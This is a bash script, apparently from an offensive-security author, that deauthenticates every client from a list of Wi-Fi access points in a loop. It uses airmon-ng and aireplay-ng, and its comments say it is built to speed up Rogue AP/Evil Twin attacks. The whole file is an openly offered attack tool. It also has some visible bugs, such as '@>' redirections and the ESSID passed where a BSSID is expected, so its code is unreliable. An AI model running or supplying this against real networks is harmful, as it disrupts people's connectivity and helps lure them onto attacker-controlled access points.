#!/bin/bash

#
# Simple script intended to perform mass-deauthentication of
# any associated&authenticated client to the Access-Point.
# Helpful to actively speed up Rogue AP/Evil Twin attacks in 
# multiple Access-Points within an ESSID environments. 
#
# In other words, if you have an ESSID set up from many
# access-points (BSSIDs) - this script will help you
# deauthenitcate all clients from those APs iteratively.
#
# Expected config file must obey the following format:
#	-----------------------------------------------
#	# Specify an interface
#	iface = wlp4s0
#	
#	# Number of deauths
#	deauths = 3
#	
#	# Retry deauths, 0 - infinity
#	retry = 3
#	
#	# Here comes a list of APs to attack. The list entry form is following:
#	#	target = <essid> <bssid> <channel>
#	target = test 00:11:22:33:44:55 14
#	target = test2 00:11:22:33:44:55 14
#	target = test3 00:11:22:33:44:55 14
#	-----------------------------------------------
#
# Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
#

if [ $# -ne 1 ]; then
	echo "Usage: ./massDeauth <configFile>"
	exit 1
fi

function deauthClients {
	echo -e "\tDeauthing clients in AP: $essid / $bssid, $ch"
	iface=$1
	essid=$2
	bssid=$3
	ch=$4
	deauths=$5

	airmon-ng stop $iface @> /dev/null

	echo -e "\t[1] Starting monitor on channel $ch"
	airmon-ng start $iface $ch @> /dev/null

	echo -e "\t[2] Deauthing $deauths number of times..."
	aireplay-ng --deauth $deauths -a $essid $iface
}

config=$(cat $1 | grep -vE '^#')
retry=$(echo "$config" | grep retry | cut -d= -f2 | cut -d' ' -f2-)
deauths=$(echo "$config" | grep deauths | cut -d= -f2 | cut -d' ' -f2-)
iface=$(echo "$config" | grep iface | cut -d= -f2 | cut -d' ' -f2-)

echo "Using interface: $iface"

IFS=$'\n'
if [ $retry -eq 0 ]; then
	retry=99999999
fi

for i in $(seq 0 $retry); do
	echo -e "\n[$i] Deauthing clients..."
	for line in $(echo "$config" | grep 'target' | cut -d= -f2 | cut -d' ' -f2-); do
		essid=$(echo "$line" | awk '{print $1}')
		bssid=$(echo "$line" | awk '{print $2}')
		ch=$(echo "$line" | awk '{print $3}')
		
		deauthClients $iface $essid $bssid $ch $deauths
	done
done
